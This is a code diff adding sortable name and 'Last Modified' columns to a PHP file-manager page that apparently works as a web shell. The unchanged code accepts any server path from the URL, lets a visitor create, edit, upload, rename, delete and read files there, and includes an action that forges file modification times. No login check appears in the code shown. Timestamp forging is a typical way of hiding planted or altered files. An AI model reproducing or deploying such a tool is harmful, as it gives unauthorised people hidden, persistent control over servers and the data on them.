@@ -12,7 +12,10 @@ $path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
 if (!$path || !is_dir($path)) $path = getcwd();
 $parent = dirname($path);
 
-// Handle POST
+$sort = $_GET['sort'] ?? 'name';      // default sort by name
+$order = $_GET['order'] ?? 'asc';     // default ascending
+
+// Handle POST actions
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     if (isset($_POST['new_folder'])) mkdir($path.'/'.basename($_POST['new_folder']));
     elseif (isset($_POST['new_file'])) file_put_contents($path.'/'.basename($_POST['new_file']), '');
@@ -20,19 +23,42 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     elseif (isset($_POST['rename_from']) && isset($_POST['rename_to'])) rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']));
     elseif (isset($_POST['edit_file']) && isset($_POST['content'])) file_put_contents($path.'/'.basename($_POST['edit_file']),$_POST['content']);
     elseif (isset($_FILES['files'])) foreach($_FILES['files']['tmp_name'] as $i=>$tmp) move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]));
-    elseif (isset($_POST['update_mtime']) && isset($_POST['mtime_value'])) {
-        $file=$path.'/'.basename($_POST['update_mtime']);
-        @touch($file, strtotime($_POST['mtime_value']));
-    }
+    elseif (isset($_POST['update_mtime']) && isset($_POST['mtime_value'])) { $file=$path.'/'.basename($_POST['update_mtime']); @touch($file, strtotime($_POST['mtime_value']));}
     elseif (isset($_POST['get_content'])) { $f=$path.'/'.basename($_POST['get_content']); if(is_file($f)) echo file_get_contents($f); exit;}
 }
+
 $files = scandir($path);
 
-// Pisahkan folder & file
+// Pisahkan folder & file, simpan data mtime juga
 $folders=[];$regular_files=[];
 foreach($files as $f){
     if($f=='.'||$f=='..')continue;
-    if(is_dir($path.'/'.$f)) $folders[]=$f; else $regular_files[]=$f;
+    $fp=$path.'/'.$f;
+    $mtime=filemtime($fp);
+    if(is_dir($fp)) $folders[]= ['name'=>$f,'mtime'=>$mtime];
+    else $regular_files[]= ['name'=>$f,'mtime'=>$mtime];
+}
+
+// Fungsi sorting
+$sort_func = function($a,$b) use($sort,$order){
+    if($sort=='mtime'){
+        return $order=='asc' ? $a['mtime']<=>$b['mtime'] : $b['mtime']<=>$a['mtime'];
+    } else { // name
+        return $order=='asc' ? strcasecmp($a['name'],$b['name']) : strcasecmp($b['name'],$a['name']);
+    }
+};
+usort($folders,$sort_func);
+usort($regular_files,$sort_func);
+
+// Fungsi toggle order (asc <-> desc)
+function toggle_order($current) {
+    return $current=='asc'?'desc':'asc';
+}
+
+// Build URL with new sort/order
+function sort_url($by,$current_sort,$current_order,$path) {
+    $order=($by==$current_sort) ? toggle_order($current_order) : 'asc';
+    return '?path='.urlencode($path).'&sort='.$by.'&order='.$order;
 }
 ?>
 <!DOCTYPE html>
@@ -83,19 +109,29 @@ $(function(){
 </div>
 
 <table class="min-w-full bg-white border">
-<tr class="bg-gray-200"><th class="p-2 text-left">Name</th><th class="p-2">Last Modified</th><th class="p-2">Action</th></tr>
+<tr class="bg-gray-200">
+<th class="p-2 text-left">
+<a href="<?=sort_url('name',$sort,$order,$path)?>" class="hover:underline">Name<?=($sort=='name'?($order=='asc'?' 🔼':' 🔽'):'')?></a>
+</th>
+<th class="p-2">
+<a href="<?=sort_url('mtime',$sort,$order,$path)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a>
+</th>
+<th class="p-2">Action</th>
+</tr>
 <?php foreach(array_merge($folders,$regular_files) as $f): 
-$fp=$path.'/'.$f;$mtime=date('Y-m-d\TH:i',$m=filemtime($fp)); ?>
+$fp=$path.'/'.$f['name']; $mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
 <tr class="border-t">
 <td class="p-2">
-<?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500 underline">📁 <?=htmlspecialchars($f)?></a>
-<?php else:?>📄 <?=htmlspecialchars($f)?><?php endif;?>
+<?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500 underline">📁 <?=htmlspecialchars($f['name'])?></a>
+<?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?>
 </td>
-<td class="p-2"><button data-file="<?=htmlspecialchars($f)?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$m)?></button></td>
+<td class="p-2">
+<button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button>
+</td>
 <td class="p-2 space-x-1">
-<?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f)?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button><?php endif;?>
-<button data-file="<?=htmlspecialchars($f)?>" class="rename-btn bg-green-300 px-2 rounded">✏️ Rename</button>
-<button data-file="<?=htmlspecialchars($f)?>" class="delete-btn bg-red-400 px-2 rounded">🗑️ Delete</button>
+<?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button><?php endif;?>
+<button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-green-300 px-2 rounded">✏️ Rename</button>
+<button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-red-400 px-2 rounded">🗑️ Delete</button>
 </td></tr><?php endforeach;?>
 </table>
 
